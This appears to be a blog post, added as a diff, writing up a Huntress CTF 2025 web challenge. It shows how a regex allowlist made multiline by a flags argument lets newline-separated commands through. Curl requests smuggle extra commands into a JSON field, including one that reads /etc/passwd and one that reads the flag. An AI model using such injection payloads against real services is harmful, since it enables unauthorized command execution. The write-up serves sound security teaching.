@@ -1,0 +1,80 @@
+---
+
+layout: post
+title: "Huntress CTF 2025 - Arika"
+categories: writeup web 
+permalink: :categories/:title
+
+---
+
+## Challenge Description
+
+The Arika ransomware group likes to look slick and spiffy with their cool green-on-black terminal style website... but it sounds like they are worried about some security concerns of their own!
+
+## Initial Reconnaissance
+
+When first approaching the Arika website, I encountered a terminal-style interface with a limited set of allowed commands: `leaks`, `news`, `contact`, `help`, `whoami`, `date`, `hostname`, and `clear`. 
+
+I started by testing the basic functionality:
+
+```bash
+curl -s -X POST http://10.1.180.56/ -H 'Content-Type: application/json' -d '{"command":"help"}' | jq .
+```
+
+The response confirmed the application was working and showed the allowlist. My initial thought was to try classic command injection techniques:
+
+```bash
+# Attempt 1: Semicolon injection
+curl -s -X POST http://10.1.180.56/ -H 'Content-Type: application/json' -d '{"command":"help; ls"}' | jq .
+
+# Attempt 2: Pipe injection  
+curl -s -X POST http://10.1.180.56/ -H 'Content-Type: application/json' -d '{"command":"leaks && cat /etc/passwd"}' | jq .
+```
+
+**Result**: All attempts failed with "Run 'help' to see valid commands" error. The allowlist seemed robust at first glance.
+
+Examining the provided `app.py` revealed the vulnerability:
+
+```python
+if not any([ re.match(r"^%s$" % allowed, command, len(ALLOWLIST)) for allowed in ALLOWLIST]):
+```
+
+The critical insight was recognizing that `len(ALLOWLIST)` equals 8, which corresponds to `re.MULTILINE` flag in Python's regex module. This changed everything!
+
+### Understanding the MULTILINE Flag Impact
+
+With `re.MULTILINE`:
+
+- `^` matches start of **any line** (not just start of string)
+    
+- `$` matches end of **any line** (not just end of string)
+    
+
+This meant the pattern `^help$` would match if "help" appeared as a complete line anywhere in the input, not just as the entire input.
+
+### Proof of Concept
+
+I tested the newline injection theory:
+```bash
+curl -s -X POST http://10.1.180.56/ -H 'Content-Type: application/json' -d '{"command":"leaks\nls"}' | jq .
+```
+
+**Success!** The response showed both the leaks output AND a directory listing, confirming command injection was possible.
+
+And we see the flag also so just by running:
+
+```bash
+curl -s -X POST http://10.1.180.56/ -H 'Content-Type: application/json' -d '{"command":"help\ncat flag.txt"}' | jq .
+```
+
+We get the flag
+
+Response:
+```
+{
+  "code": 0,
+  "ok": true,
+  "stderr": "",
+  "stdout": "List of all commands:\n leaks      — hacked companies\n news       — news about upcoming data releases\n contact    — send us a message and we will contact you\n help       — available commands\n clear      — clear screen\nflag{eaec346846596f7976da7e1adb1f326d}\n"
+}
+```
